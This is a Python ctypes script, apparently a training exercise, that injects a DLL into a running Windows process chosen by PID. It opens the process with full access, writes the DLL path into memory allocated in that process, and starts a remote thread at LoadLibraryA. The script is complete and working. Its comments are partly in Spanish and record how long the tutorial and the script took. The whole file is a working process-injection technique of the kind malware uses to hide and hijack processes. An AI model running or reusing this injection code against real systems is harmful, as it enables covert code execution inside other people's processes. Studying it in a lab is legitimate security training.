# Remote DLL Injection TCM 201 python
# Allocate remote memory in a remote process, Write a DLL location into the remote memory(library),the external process load that library.
#13-02-2023

from ctypes import *
from ctypes import wintypes
#config (this must be changed) 
PID_value=2160
Location_dll=b"C:\\Users\\neutr\\Downloads\\hello_world.dll"
#-------

kernel32 = windll.kernel32
LPCTSTR = c_char_p #define un tipo de datos que representa una cadena de caracteres  
SIZE_T = c_size_t #define un tipo de datos que representa un tamaño en bytes

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD) #3 argumentos
OpenProcess.restype = wintypes.HANDLE #espera que la función devuelva  un identificador de un objeto en el sistema operativo

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

GetModuleHandle = kernel32.GetModuleHandleA
GetModuleHandle.argtypes = (LPCTSTR, )
GetModuleHandle.restype = wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (wintypes.HANDLE, LPCTSTR)
GetProcAddress.restype = wintypes.LPVOID

class _SECURITY_ATTIBUTES(Structure):
	_fields_ = [('nLength', wintypes.DWORD), ('lpSecurityDescriptor', wintypes.LPVOID), ('bInheritHandle', wintypes.BOOL),]

_SECURITY_ATTIBUTES = _SECURITY_ATTIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

# Location of the file.
dll = Location_dll #change this value in config
pid = PID_value # #change this value in config

# Open a handle to that process.

handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)

if not handle:
	raise WinError()

print('Handle obtained => {0:X}'.format(handle))

# Allocate memory

remote_memory = VirtualAllocEx(handle, False, len(dll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)

if not remote_memory:
	raise WinError()

print('Memory allocated => ', hex(remote_memory))

# Writes process memory into the newly created remote memory

write = WriteProcessMemory(handle, remote_memory, dll, len(dll) + 1, None)

if not write:
	raise WinError()

print('Bytes written => {}'.format(dll))

load_lib = GetProcAddress(GetModuleHandle(b'kernel32.dll') , b'LoadLibraryA')

print('LoadLibrary address => ', hex(load_lib))

# Start remote thread

rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, EXECUTE_IMMEDIATELY, None)


#time tutorial 20min
#time script 50min.
